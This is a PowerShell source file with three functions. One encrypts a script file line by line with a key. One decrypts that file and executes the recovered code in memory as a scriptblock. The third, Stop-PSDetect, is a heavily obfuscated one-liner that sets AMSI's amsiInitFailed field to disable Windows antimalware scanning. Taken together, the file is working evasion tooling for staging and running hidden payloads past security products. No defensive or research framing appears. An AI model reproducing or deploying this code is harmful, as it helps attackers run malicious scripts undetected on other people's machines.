function Invoke-EncryptData{
    Param(
        [String]$InputFile,
        [String]$OutPutDir = (Get-Location).path,
        [Byte[]]$EncryptionKey,
        [String]$Command = ""
        )
    
    Remove-Item -Path $OutPutDir\KeyFile.txt -ErrorAction SilentlyContinue
    Remove-Item -Path $OutPutDir\EncryptedFile.txt -ErrorAction SilentlyContinue
    Add-Content -Path $OutPutDir\KeyFile.txt $EncryptionKey

    $InputData = Get-Content $InputFile
    
    foreach($line in $InputData){
        If($line -eq ""){Add-Content -Path $OutPutDir\EncryptedFile.txt "#"}
        ElseIf($line.length -gt 30000){

            $chunklet = 3000
            $n = $line.length

            [int]$loops = [math]::floor($n/$chunklet)
            $rmd = $n - ($loops*$chunklet)
            [int]$i = 1
            [int]$index = 0
            While($i -le $loops){
                $chunk = $line.substring($index,$chunklet)
                #$chunk = $chunk + '`'
                $SecureData = ConvertTo-SecureString $chunk -AsPlainText -Force
                $EncryptedData = ConvertFrom-SecureString -SecureString $SecureData -Key $EncryptionKey
                Add-Content -Path $OutPutDir\EncryptedFile.txt $EncryptedData
                $i++
                $index = $index + $chunklet
              }
        $chunk = $line.substring($index,$rmd)
        $SecureData = ConvertTo-SecureString $chunk -AsPlainText -Force
        $EncryptedData = ConvertFrom-SecureString -SecureString $SecureData -Key $EncryptionKey
        Add-Content -Path $OutPutDir\EncryptedFile.txt $EncryptedData

        }Else{
            $SecureData = ConvertTo-SecureString $line -AsPlainText -Force
            $EncryptedData = ConvertFrom-SecureString -SecureString $SecureData -Key $EncryptionKey
            Add-Content -Path $OutPutDir\EncryptedFile.txt $EncryptedData
        }
    }
    
    If($Command -ne ""){
        $SecureCommand = ConvertTo-SecureString $Command -AsPlainText -Force
        $EncryptCommand = ConvertFrom-SecureString -SecureString $SecureCommand -Key $EncryptionKey
        Add-Content -Path $OutPutDir\EncryptedFile.txt $EncryptCommand
        }
}

function Invoke-RunDecryption{
    param(
        [Byte[]]$EncryptionKey,
        [String]$DecryptFile,
        [String]$Command = ""
    )

    $DecryptData = Get-Content $DecryptFile

    $OutString = @()
    foreach($line in $DecryptData){
        If($line -eq "#"){
            $String = $line
            $OutString += $String
        }Else{
            $SecureData = ConvertTo-SecureString $line -Key $EncryptionKey
            $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecureData)
            [string]$String = [Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
            [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
            $OutString += $String
        }
    }
    
    If($Command -ne ""){
        $OutString += $Command
    }

    $MidString = $OutString -join "`r`n" | Out-String
    $sb = [scriptblock]::Create($MidString)
    Invoke-Command -ScriptBlock $sb

}


function Stop-PSDetect{
    sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} ) 
}
